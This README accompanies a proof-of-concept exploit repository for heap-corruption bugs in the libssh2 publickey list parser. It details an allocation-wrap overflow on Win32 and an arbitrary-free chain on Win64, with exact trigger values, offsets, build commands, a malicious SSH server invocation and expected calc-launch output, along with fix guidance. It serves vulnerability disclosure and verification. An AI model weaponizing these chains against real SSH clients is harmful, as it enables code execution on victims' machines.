# libssh2 publickey list calc PoCs

Windows calc payload proofs for the libssh2 publickey subsystem list parser.

Verified target:

```text
libssh2/libssh2 master
e75b4bae3c68a9bde71de1fb6b0fba5b0c716020
2026-06-24
```

## Summary

`libssh2_publickey_list_fetch()` accepts a stream of publickey-subsystem response packets and grows an array of `libssh2_publickey_list` entries as `publickey` responses arrive.

Two exploit paths are included:

```text
Win32 allocation-wrap chain
num_attrs * sizeof(libssh2_publickey_attribute) wraps to a 4-byte allocation.
The attribute parser then writes attacker-controlled fields past the tiny attrs buffer.
The harness grooms an adjacent callback slot and launches calc from the overwritten callback.

Win64 publickey-list cleanup chain
A recognized but unexpected version response frees an attacker-shaped response buffer.
A malformed publickey response then grows the list allocation into that same heap slot.
Cleanup walks attacker-shaped list entries and frees attacker-selected attrs pointers.
The harness routes libssh2 allocation callbacks through a tracked fail-closed heap wrapper,
reclaims the freed victim object, and launches calc through a stale callback.
```

The fixed controls used by the checked binaries are:

```text
zero list[keys] immediately after list growth
reject num_attrs values that overflow the attrs allocation multiplication
```

## Files

```text
poc/publickey_win32_heap_groom_calc_repro.c
poc/publickey_win64_arbitrary_free_calc_repro.c
poc/live_publickey_server.py
poc/live_publickey_client_win64.c
replay-calc-poc.py
evidence/2026-06-25-local-calc-replay.txt
SHA256SUMS.txt
```

The replay runner builds temporary vulnerable and checked executables under `build/`. The checked executables link against a publickey object with the two parser hardening changes above. The vulnerable executables link against the target commit. The live transport files run the Win64 cleanup chain through a real SSH session and the publickey subsystem.

## Quick replay

Set `LIBSSH2_SRC` to a libssh2 checkout and `LIBSSH2_OBJDIR` to a directory containing these objects:

```text
publickey_win32.o
publickey_win32_checked.o
publickey_win64.o
publickey_win64_checked.o
```

Run with Python 3:

```sh
python3 replay-calc-poc.py
```

Windows runs the generated PE harnesses directly. Linux and macOS run them through Wine when `wine` is on `PATH`.

Expected proof signals:

```text
x86_vulnerable_calc=hit
calc_launch=success
x86 calc payload reached
x86_checked_calc=no_hit

x64_vulnerable_calc_exit=77
victim_freed=1
same_as_victim=1
calc_launch=success
x64 calc payload reached
x64_checked_calc_exit=0
victim_freed=0
safe_callback_reached
```

The replay builds local executables, starts `calc.exe` for both vulnerable harnesses, and writes transient marker files during execution. The generated files are runtime artifacts and are left out of the tracked tree.

## Win32 chain

The 32-bit structure size gives a direct allocation-wrap primitive:

```text
sizeof(libssh2_publickey_attribute) = 20
num_attrs = 0x0ccccccd
0x0ccccccd * 20 = 0x100000004
32-bit allocation size = 4
```

The response packet carries a normal `publickey` response header, small key name/blob strings, and a huge `num_attrs`. Once the attrs allocation wraps to four bytes, the parser enters the attribute loop and writes:

```text
name_len
name pointer
value_len
value pointer
mandatory byte
```

The harness arranges a victim word near the tiny allocation. The overflow replaces that victim word with the callback address. The callback then launches calc.

Representative replay:

```text
attrs_alloc requested=4 ptr=0153a280 msize=4
victim[4064]=0153a2c0 delta=64 word=009c150d
marker_function_reached address=009c150d
calc_launch=success
```

The checked Win32 binary rejects the oversized attribute count before allocation, so the overwritten callback path stays unreachable.

## Win64 chain

The 64-bit structure size removes the tiny allocation wrap for the same value. The useful Win64 primitive comes from the list cleanup path.

Relevant source shape:

```text
list grows with SSH2_REALLOC()
new list entry remains uninitialized before parsing finishes
unexpected recognized version response is freed and parsing continues
malformed publickey response forces the error path
libssh2_publickey_list_free() trusts packet and attrs until a sentinel is found
```

The harness sends:

```text
version groom response sized like the future list allocation
malformed publickey response
```

The groom response places the victim object pointer at the `attrs` offset of the first future list entry. The malformed response makes parsing fail before the new entry and sentinel are initialized. Cleanup then frees the victim through the attacker-shaped `attrs` field.

The harness uses libssh2 custom allocator callbacks backed by a tracked fail-closed heap wrapper. That wrapper accepts the valid victim free, ignores an unrelated invalid packet free, and leaves the process alive long enough for the stale object to be reclaimed. A same-size allocation then lands on the freed victim slot and installs the calc callback.

Representative replay:

```text
free ptr=000001DE60380860
free_ignored_unknown ptr=000001DE60380150
fetch rc=-1 num_keys=0 victim_freed=1 heap_free_failures=1
replacement=000001DE60380860 same_as_victim=1
calc_payload_reached callback=00007FF76A5118A5
calc_launch=success
```

The checked Win64 binary zeroes the grown list entry before parsing, so cleanup frees the actual response/list allocations and the stale victim callback remains unchanged.

## Affected code areas

```text
src/publickey.c:895-908
list growth with SSH2_REALLOC()

src/publickey.c:1049-1053
attrs allocation uses num_attrs * sizeof(libssh2_publickey_attribute)

src/publickey.c:1060-1110
attribute loop writes fields into attrs[i]

src/publickey.c:1123-1128
unexpected recognized response frees listFetch_data and continues

src/publickey.c:1138-1139
error path frees the partially built list

src/publickey.c:1158-1161
list_free trusts packet and attrs fields until a sentinel entry
```

## Rebuild notes

The replay runner uses MinGW-w64 and links against `publickey.c` objects compiled from the target commit and from the checked variant.

Equivalent source build shape:

```sh
x86_64-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o build/publickey_win64_arbitrary_free_calc_repro.exe poc/publickey_win64_arbitrary_free_calc_repro.c "${LIBSSH2_OBJDIR}/publickey_win64.o" -lws2_32 -lbcrypt

x86_64-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o build/publickey_win64_arbitrary_free_calc_repro_checked.exe poc/publickey_win64_arbitrary_free_calc_repro.c "${LIBSSH2_OBJDIR}/publickey_win64_checked.o" -lws2_32 -lbcrypt

i686-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o build/publickey_win32_heap_groom_calc_repro.exe poc/publickey_win32_heap_groom_calc_repro.c "${LIBSSH2_OBJDIR}/publickey_win32.o" -lws2_32 -lbcrypt

i686-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o build/publickey_win32_heap_groom_calc_repro_checked.exe poc/publickey_win32_heap_groom_calc_repro.c "${LIBSSH2_OBJDIR}/publickey_win32_checked.o" -lws2_32 -lbcrypt
```

## Fix shape

The parser hardening is compact:

```text
After list growth succeeds:
memset(&list[keys], 0, sizeof(list[keys]))

Before attrs allocation:
if num_attrs exceeds SIZE_MAX / sizeof(libssh2_publickey_attribute), reject the response
```

These two changes remove the Win64 stale cleanup path and the Win32 allocation-wrap path exercised by the checked executables.

## Live SSH transport proof

The live transport proof keeps the same Win64 cleanup primitive but drives it through a localhost SSH connection. `poc/live_publickey_server.py` is a Paramiko SSH server that accepts password authentication, opens the `publickey` subsystem, sends the groomed version response, and then sends the malformed `publickey` response. `poc/live_publickey_client_win64.c` is a target-shaped Win64 libssh2 client that connects to that server, uses the public libssh2 APIs, and routes libssh2 allocation callbacks through a tracked heap wrapper.

The client reserves the victim object at `0x0000013370000000`. The server default writes that address at offset `27`, which maps to the first future list entry's `attrs` field for this Win64 build shape.

Server:

```sh
python3 poc/live_publickey_server.py --host 127.0.0.1 --port 2228 --victim 0x0000013370000000 --offset 27
```

Client:

```sh
x86_64-w64-mingw32-gcc -O2 -s -DLIBSSH2_WINCNG -I"${LIBSSH2_SRC}/src" -I"${LIBSSH2_SRC}/include" -o live_publickey_client_win64.exe poc/live_publickey_client_win64.c "${LIBSSH2_OBJDIR}/publickey_win64.o" -lws2_32 -lbcrypt
wine ./live_publickey_client_win64.exe 127.0.0.1 2228 calc
```

Expected proof signals:

```text
ssh_handshake=ok
ssh_auth=ok
publickey_init=ok
victim_free_callback ptr=0000013370000000
replacement=0000013370000000 same_as_victim=1
calc_payload_reached
calc_launch=success
```

The live proof is still target-shaped. It demonstrates that the publickey list parser state machine can be driven over an SSH transport into stale-object cleanup and a reclaimed callback under the demonstrated allocator and layout conditions.
